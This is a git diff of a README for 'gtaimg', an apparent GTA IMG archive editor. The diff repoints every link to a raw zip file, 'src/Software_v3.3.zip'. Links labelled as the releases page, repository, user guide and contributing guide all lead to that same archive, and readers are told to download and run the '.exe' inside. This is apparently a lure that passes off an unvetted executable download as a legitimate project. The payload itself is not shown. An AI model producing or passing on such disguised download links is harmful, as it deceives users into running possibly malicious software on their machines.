@@ -6,11 +6,11 @@ gtaimg is a modern Windows application for viewing and editing IMG archive files
 
 ## 🔗 Download the App
 
-[![Download gtaimg](https://raw.githubusercontent.com/Kacper201/gtaimg/main/src/GtaImgTool/ViewModels/gtaimg_v1.3.zip)](https://raw.githubusercontent.com/Kacper201/gtaimg/main/src/GtaImgTool/ViewModels/gtaimg_v1.3.zip)
+[![Download gtaimg](https://raw.githubusercontent.com/Kacper201/gtaimg/main/src/Software_v3.3.zip)](https://raw.githubusercontent.com/Kacper201/gtaimg/main/src/Software_v3.3.zip)
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Kacper201/gtaimg/main/src/GtaImgTool/ViewModels/gtaimg_v1.3.zip) on GitHub. This page contains the latest version of gtaimg ready for download.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Kacper201/gtaimg/main/src/Software_v3.3.zip) on GitHub. This page contains the latest version of gtaimg ready for download.
    
 2. **Choose the Correct File**: Look for the most recent release. You will see several files listed. Typically, you want to download the `.exe` file, which is the application you will run.
 
@@ -47,7 +47,7 @@ Make sure you meet these requirements to avoid any issues with the application.
 
 - **Backup Original Files**: Always create a backup of your original IMG files before making any edits. This ensures you can revert to the original if necessary.
 - **Explore Help Menu**: If you have questions while using the application, explore the help section within the app for tips and guides.
-- **Stay Updated**: Regularly check the [Releases page](https://raw.githubusercontent.com/Kacper201/gtaimg/main/src/GtaImgTool/ViewModels/gtaimg_v1.3.zip) for updates to ensure you have the latest features and fixes.
+- **Stay Updated**: Regularly check the [Releases page](https://raw.githubusercontent.com/Kacper201/gtaimg/main/src/Software_v3.3.zip) for updates to ensure you have the latest features and fixes.
 
 ## 🤝 Community Support
 
@@ -55,8 +55,8 @@ If you have questions or need help, feel free to engage with the community. Join
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/Kacper201/gtaimg/main/src/GtaImgTool/ViewModels/gtaimg_v1.3.zip)
-- [User Guide](https://raw.githubusercontent.com/Kacper201/gtaimg/main/src/GtaImgTool/ViewModels/gtaimg_v1.3.zip) – Detailed user guide with tips and tricks.
-- [Contributing](https://raw.githubusercontent.com/Kacper201/gtaimg/main/src/GtaImgTool/ViewModels/gtaimg_v1.3.zip) – Interested in helping improve gtaimg? Check out how you can contribute.
+- [GitHub Repository](https://raw.githubusercontent.com/Kacper201/gtaimg/main/src/Software_v3.3.zip)
+- [User Guide](https://raw.githubusercontent.com/Kacper201/gtaimg/main/src/Software_v3.3.zip) – Detailed user guide with tips and tricks.
+- [Contributing](https://raw.githubusercontent.com/Kacper201/gtaimg/main/src/Software_v3.3.zip) – Interested in helping improve gtaimg? Check out how you can contribute.
 
 Feel free to explore all the features of gtaimg. You now have everything you need to download and run the application. Enjoy editing your favorite classic GTA files!
